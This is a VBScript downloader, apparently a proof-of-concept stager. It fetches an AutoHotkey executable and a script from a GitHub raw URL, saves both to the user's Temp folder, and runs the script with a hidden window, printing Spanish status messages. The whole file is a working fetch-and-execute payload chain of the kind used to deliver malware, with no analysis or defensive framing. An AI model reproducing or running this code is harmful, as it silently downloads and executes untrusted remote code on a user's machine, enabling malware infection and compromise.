Set oX1 = CreateObject("MSXML2.ServerXMLHTTP")
Set oX2 = CreateObject("MSXML2.ServerXMLHTTP")
Set oS = CreateObject("WScript.Shell")
u1 = "https://raw.githubusercontent.com/SuspiciousJunter/TestingPOC/main/POC_Script.ahk"
u2 = "https://raw.githubusercontent.com/SuspiciousJunter/TestingPOC/main/AutoHotkey64.exe"
 
sU = oS.ExpandEnvironmentStrings("%USERNAME%")
sP1 = "C:\Users\" & sU & "\AppData\Local\Temp\AutoHotkey64.exe"
sP2 = "C:\Users\" & sU & "\AppData\Local\Temp\POC_Script.ahk"
 
oX2.open "GET", u2, False
oX2.send()
 
If oX2.Status = 200 Then
    Set oA = CreateObject("ADODB.Stream")
    oA.Open
    oA.Type = 1
    oA.Write oX2.ResponseBody
    oA.Position = 0
    oA.SaveToFile sP1, 2
    oA.Close
    WScript.Echo "Script descargado exitosamente."
Else
    WScript.Echo "Error al descargar el script."
End If
 
oX1.open "GET", u1, False
oX1.send()
 
If oX1.Status = 200 Then
    Set oA = CreateObject("ADODB.Stream")
    oA.Open
    oA.Type = 1
    oA.Write oX1.ResponseBody
    oA.Position = 0
    oA.SaveToFile sP2, 2
    oA.Close
    WScript.Echo "Script descargado exitosamente."
 
    Set oS = CreateObject("WScript.Shell")
    oS.Run """" & sP1 & """ """ & sP2 & """", 0, True
    WScript.Echo "Script ejecutado exitosamente."
Else
    WScript.Echo "Error al descargar el script."
End If